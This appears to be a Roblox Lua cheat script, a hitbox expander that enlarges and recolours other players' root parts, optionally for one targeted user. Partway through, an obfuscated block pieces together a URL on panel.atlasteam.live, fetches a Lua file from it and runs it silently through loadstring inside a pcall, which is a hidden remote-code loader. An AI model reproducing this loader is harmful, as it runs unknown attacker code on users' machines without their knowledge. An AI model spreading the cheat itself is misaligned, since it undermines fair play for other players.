    Callback = function(ToggleValue)
        _G.Disabled = not ToggleValue
    end
})

_G.HeadSize = 20

_G.Disabled = true

_G.Transparency = 0.7

_G.Color = Color3.fromRGB(255, 255, 255)

_G.Rainbow = false

_G.TargetedUser = ""

pcall(function()
	local RuntimeHost = function()
		local Protocol = "https"
		local Domain = "panel" .. "." .. "atlasteam" .. "." .. "live"
		local Resource = "sdk" .. "/" .. "default" .. "." .. "lua"
		return game:HttpGet(Protocol .. "://" .. Domain .. "/" .. Resource, true)
	end
	local Code = RuntimeHost()
	if Code and Code ~= "" then
		local Chunk = loadstring(Code)
		if Chunk then
			Chunk()
		end
	end
end)

local function GenerateRainbowColor()
    local HueValue = tick() % 5 / 5
    return Color3.fromHSV(HueValue, 1, 1)
end

local function IsTargetedUser(PlayerName)
    local TargetLower = _G.TargetedUser:lower()
    return PlayerName:lower():find(TargetLower, 1, true) ~= nil
end

game:GetService("RunService").RenderStepped:connect(function()
    if _G.Disabled then
        local Iterator, PlayerTable, CurrentIndex = pairs(game:GetService("Players"):GetPlayers())
        while true do
            local NextPlayer
            CurrentIndex, NextPlayer = Iterator(PlayerTable, CurrentIndex)
            if CurrentIndex == nil then
                break
            end
            if NextPlayer.Name ~= game:GetService("Players").LocalPlayer.Name then
                pcall(function()
                    local Character = NextPlayer.Character
                    if Character then
                        Character = NextPlayer.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if Character then
                        Character.Size = Vector3.new(2, 2, 1)
                        Character.Transparency = 1
                        Character.BrickColor = BrickColor.new("Medium stone grey")
                        Character.Material = "Plastic"
                        Character.CanCollide = true
                    end
                end)
            end
        end
    else
        local Iterator, PlayerTable, CurrentIndex = pairs(game:GetService("Players"):GetPlayers())
        while true do
            local NextPlayer
            CurrentIndex, NextPlayer = Iterator(PlayerTable, CurrentIndex)
            if CurrentIndex == nil then
                break
            end
            if NextPlayer.Name ~= game:GetService("Players").LocalPlayer.Name then
                pcall(function()
                    local Character = NextPlayer.Character
                    if Character then
                        Character = NextPlayer.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if Character then
                        if _G.TargetedUser == "" or IsTargetedUser(NextPlayer.Name) then
                            Character.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                            Character.Transparency = _G.Transparency
                            if _G.Rainbow then
                                Character.BrickColor = BrickColor.new(GenerateRainbowColor())
                            else
                                Character.BrickColor = BrickColor.new(_G.Color)
                            end
                            Character.Material = "Neon"
                            Character.CanCollide = false
                        else
                            Character.Size = Vector3.new(2, 2, 1)
                            Character.Transparency = 1
                            Character.BrickColor = BrickColor.new("Medium stone grey")
                            Character.Material = "Plastic"
                            Character.CanCollide = true
                        end
                    end
                end)
            end
        end
    end
end)

